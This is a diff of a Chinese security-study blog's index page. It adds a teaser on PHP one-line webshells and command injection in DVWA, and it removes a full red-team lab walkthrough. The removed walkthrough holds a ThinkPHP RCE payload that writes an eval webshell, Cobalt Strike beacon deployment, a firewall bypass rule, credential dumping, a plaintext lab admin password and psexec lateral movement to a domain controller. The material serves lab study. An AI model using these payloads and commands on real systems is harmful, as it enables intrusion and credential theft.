@@ -184,6 +184,100 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://studying-bo.github.io/2021/12/29/windows%E5%92%8Clinux%E5%85%B3%E4%BA%8Ephp%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/weixin.jpg">
+      <meta itemprop="name" content="Bo Li">
+      <meta itemprop="description" content="I am a computer student at school. This is my first blog. I will use it to record my training notes and learning contents. Welcome to visit and exchange learning">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="~Welcome to My Blog~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/29/windows%E5%92%8Clinux%E5%85%B3%E4%BA%8Ephp%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" class="post-title-link" itemprop="url">windows和linux一句话木马区别</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-29 15:00:50 / 修改时间：14:58:00" itemprop="dateCreated datePublished" datetime="2021-12-29T15:00:50+08:00">2021-12-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="今天学习命令执行遇到的关于php写入一句话木马的问题"><a href="#今天学习命令执行遇到的关于php写入一句话木马的问题" class="headerlink" title="今天学习命令执行遇到的关于php写入一句话木马的问题."></a>今天学习命令执行遇到的关于php写入一句话木马的问题.</h3><h4 id="通过DVWA中的命令执行题目讲解-难度low"><a href="#通过DVWA中的命令执行题目讲解-难度low" class="headerlink" title="通过DVWA中的命令执行题目讲解 难度low"></a>通过DVWA中的命令执行题目讲解 难度low</h4><h5 id="命令执行相关知识点"><a href="#命令执行相关知识点" class="headerlink" title="命令执行相关知识点"></a>命令执行相关知识点</h5><p>命令执行直接调用操作系统命令。其原理是，在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户输入的情况下，造成命令执行漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令1&amp;命令2    两个命令同时执行命令</span><br><span class="line">1&amp;&amp;命令2   只有前面命令执行成功，后面命令才继续执行</span><br><span class="line">命令1;命令2    不管前面命令执行成功没有，后面的命令继续执行</span><br><span class="line">命令1||命令2    顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">### PHP中常见命令执行函数 </span><br><span class="line"></span><br><span class="line">- system()：执行一个外部的应用程序的输入并显示输出的结果</span><br><span class="line">- exec()：执行一个外部的应用程序，但不显示输出的结果</span><br><span class="line">- passthru()：执行一个系统命令并显示原始的输出</span><br><span class="line">- shell_exec()：执行shell命令并返回输出的结果的字符串</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/29/windows%E5%92%8Clinux%E5%85%B3%E4%BA%8Ephp%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1.png" class="">
+
+<p>一道关于ping命令的命令执行题目</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/12/29/windows%E5%92%8Clinux%E5%85%B3%E4%BA%8Ephp%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://studying-bo.github.io/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -215,7 +309,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-27 22:15:01" itemprop="dateModified" datetime="2021-12-27T22:15:01+08:00">2021-12-27</time>
+                <time title="修改时间：2021-12-29 14:58:28" itemprop="dateModified" datetime="2021-12-29T14:58:28+08:00">2021-12-29</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -252,98 +346,15 @@
       
           <h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息:"></a>靶机信息:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机 kali</span><br><span class="line">ip:192.168.0.153</span><br><span class="line">靶机 web服务器</span><br><span class="line">网卡1:192.168.0.162</span><br><span class="line">网卡2:192.168.138.136</span><br><span class="line">靶机:域控</span><br><span class="line">ip:192.168.138.138</span><br></pre></td></tr></table></figure>
 
-<h4 id="相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因"><a href="#相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因" class="headerlink" title="相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因"></a>相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因</h4><h5 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.0.0/24  //探测存活主机</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/1.png" class="">
-
-<p>192.168.0.162便是我们把靶机ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -sT 192.168.0.162 //对目标靶机进行端口扫描查看开启的服务</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 21:31 CST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.0.162</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line">Not shown: 992 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B9:F4:45 (VMware)</span><br><span class="line">Device type: general purpose|media device</span><br><span class="line">Running: Microsoft Windows 2008|10|7|8.1, Microsoft embedded</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_10 cpe:/h:microsoft:xbox_one cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows Server 2008 SP2, Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One, Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: WIN7, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b9:f4:45 (VMware)</span><br><span class="line">|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: -1s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: win7</span><br><span class="line">|   NetBIOS computer name: WIN7\x00</span><br><span class="line">|   Domain name: sun.com</span><br><span class="line">|   Forest name: sun.com</span><br><span class="line">|   FQDN: win7.sun.com</span><br><span class="line">|_  System time: 2021-12-27T21:32:33+08:00</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-12-27T13:32:33</span><br><span class="line">|_  start_date: 2021-12-24T10:19:01</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   9.84 ms 192.168.0.162</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>3306一般是mysql数据库对应的服务端口</p>
-<p>尝试远程连接一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.0.162 -uroot -p </span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/2.png" class="">
-
-<p>但是目标靶机数据库貌似禁用了远程连接</p>
-<p>上面看到目标靶机还开放了80端口http服务,通过浏览器访问一下.</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/3.png" class="">
-
-<p>是一个thinkphp框架,通过报错查看对应的版本.</p>
-<p>发现是<a target="_blank" rel="noopener" href="http://www.thinkphp.cn/">ThinkPHP</a> V5.0.22</p>
-<p>网上有很多poc随便找一个尝试利用  ThinkPhp5.0任意代码执行：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttp://192.168.0.162/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_GET[&quot;xiaobao&quot;]);?^&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>通过蚁剑尝试连接</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/4.png" class="">
-
-<p>连接成功</p>
-<p>通过蚁剑的虚拟终端查看当前权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/5.png" class="">
-
-<p>直接是管理员权限.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 查看是否有域</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/7.png" class="">
-
-<p>发现存在名字为sun的域</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist //查看是否有杀毒软件</span><br></pre></td></tr></table></figure>
-
-<p>发现并没有杀毒软件</p>
-<p>这里准备cs生成一个木马把靶机上线到cs进行后渗透</p>
-<h5 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.0.153 123456 //开启cs服务器</span><br></pre></td></tr></table></figure>
-
-<p>客户端进行连接</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/8.png" class="">
-
-<p>开启一个监听并生成木马muma.exe</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/9.png" class="">
-
-<p>通过蚁剑上传到靶机对应的目录中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;muma.exe&quot; dir=in action=allow program=&quot;C:\phpStudy\WWW\muma.exe&quot; enable=yes //设置防火墙默认允许</span><br></pre></td></tr></table></figure>
-
-<p>运行木马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">muma.exe</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/10.png" class="">
-
-<p>上线成功</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net time /domain //查看域控</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/11.png" class="">
-
-<p>通过ping域控名字查看其IP地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell ping DC.sun.com</span><br><span class="line">[*] Tasked beacon to run: ping DC.sun.com</span><br><span class="line">[+] host called home, sent: 106 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">正在 Ping DC.sun.com [192.168.138.138] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net view //查看域内主机</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/12.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords //查看计算机内的用户密码</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/13.png" class="">
-
-<p>得到了目标的密码,直接通过cs中psexec模块进行票据传递攻击</p>
-<p>先开启一个SMB服务的监听</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/14.png" class="">
-
-<p>对域控进行psexec攻击</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/15.png" class="">
-
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/16.png" class="">
-
-<p>同样也可以通过命令行进行传递攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">beacon&gt; make_token SUN\Administrator hongrisec@2019</span><br><span class="line">beacon&gt; jump psexec DC 域控</span><br><span class="line">[+] host called home, sent: 58 bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line">[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_2835) on DC via Service Control Manager (\\DC\ADMIN$\79a9e06.exe)</span><br><span class="line">[+] host called home, sent: 285790 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Started service 79a9e06 on DC</span><br><span class="line">[+] host called home, sent: 74 bytes</span><br><span class="line">[+] established link to child beacon: 192.168.138.138</span><br></pre></td></tr></table></figure>
-
-<p>最后域控也成功上线</p>
-<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/17.png" class="">
-
-<h5 id="成功通关"><a href="#成功通关" class="headerlink" title="成功通关!"></a>成功通关!</h5>
+<h4 id="相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因"><a href="#相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因" class="headerlink" title="相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因"></a>相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因</h4>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1031,20 +1042,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
